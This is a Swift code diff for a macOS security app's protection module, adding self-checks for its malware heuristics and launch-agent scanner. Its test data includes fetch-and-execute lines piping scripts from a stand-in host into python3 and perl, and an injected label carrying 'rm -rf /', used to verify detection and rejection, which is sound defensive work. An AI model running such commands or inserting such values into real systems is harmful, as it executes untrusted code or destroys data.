@@ -411,6 +411,13 @@ final class ProtectionModel: AppModule {
         accessChecked = DemoData.lastScan
     }
 
+    var quickToggles: [QuickToggle] {
+        [QuickToggle(id: "protection.realtime", title: "Protection", symbol: "shield.lefthalf.filled", isOn: realtime.anyOn) { [weak self] in
+            guard let self else { return }
+            if self.realtime.anyOn { self.realtime = ProtectionRealtimeSettings() } else { self.enableRealtime() }
+        }]
+    }
+
     func applySnapshotTab(_ tab: String) {
         if tab == "hardened" { hardened = true }
         if tab == "scanning" {
@@ -478,6 +485,29 @@ final class ProtectionModel: AppModule {
         where !Remover.isQuarantinable(p, isDirectory: dir) {
             f.append("Menace : « \(p) » ne pourrait pas partir à la Corbeille")
         }
+        // A real file in /private/tmp (standardizingPath turns it into /tmp/…), where droppers land.
+        if !DemoData.isEnabled {
+            let probe = "/private/tmp/cleanmyclaude-quarantine-\(getpid())"
+            FileManager.default.createFile(atPath: probe, contents: Data("x".utf8))
+            if !Remover.isQuarantinable(probe) { f.append("Menace : un fichier de /private/tmp ne pourrait pas partir à la Corbeille") }
+            try? FileManager.default.removeItem(atPath: probe)
+        }
+        // An agent running a script with Homebrew's python3: the script may go, never the interpreter (nor its other users).
+        let job = LaunchItem(label: "local.job", plistPath: h + "/Library/LaunchAgents/local.job.plist", domain: .userAgent,
+                             program: "/opt/homebrew/bin/python3", arguments: ["/opt/homebrew/bin/python3", "/opt/homebrew/bin/pip3"],
+                             runAtLoad: true, keepAlive: false, disabled: false, running: false, signature: .adhoc, vendor: "",
+                             appPath: nil, flags: [.downloader, .script])
+        if let t = ProtectionThreatScanner.persistenceThreats([job]).first {
+            if t.removable != [job.plistPath] { f.append("Menace de démarrage : l'interpréteur partirait avec elle (\(t.removable))") }
+            if t.status != .warn { f.append("Menace de démarrage : un seul signal compté comme logiciel malveillant") }
+        } else {
+            f.append("Agent qui télécharge puis exécute du code non signalé")
+        }
+        for (text, bad) in [("curl -s https://api.example.com/v1 | python3 -m json.tool", false), ("curl -s https://x.example/p.py | python3", true),
+                            ("curl -fsSL https://x.example/i.pl | perl -", true), ("unset DYLD_INSERT_LIBRARIES", false)]
+        where (ProtectionHeuristics.isDownloader(text) || !ProtectionHeuristics.suspiciousLines(text).isEmpty) != bad {
+            f.append("Heuristique \(bad ? "muette" : "déclenchée à tort") : \(text)")
+        }
         if LaunchItemScanner.adminCommand(label: "com.x; rm -rf /", plist: "/Library/LaunchDaemons/com.x.plist", disable: true) != nil {
             f.append("Label dangereux accepté dans une commande administrateur")
         }
@@ -507,7 +537,8 @@ final class ProtectionModel: AppModule {
         }
         for a in ProtectionAnchors.scan() { out.append("\(a.kind.title) : \(a.name) — \(a.detail)") }
         let devices = ProtectionMonitor.devicesInUse()
-        out.append("Caméra \(devices.camera ? "allumée" : "éteinte") · micro \(devices.microphone ? "allumé" : "éteint")")
+        out.append("Caméra \(devices.camera ? "allumée" : "éteinte") · micro \(devices.microphone ? "allumé" : "éteint")"
+                   + (devices.users.isEmpty ? "" : " par " + devices.users.joined(separator: ", ")))
         return out
     }
 }
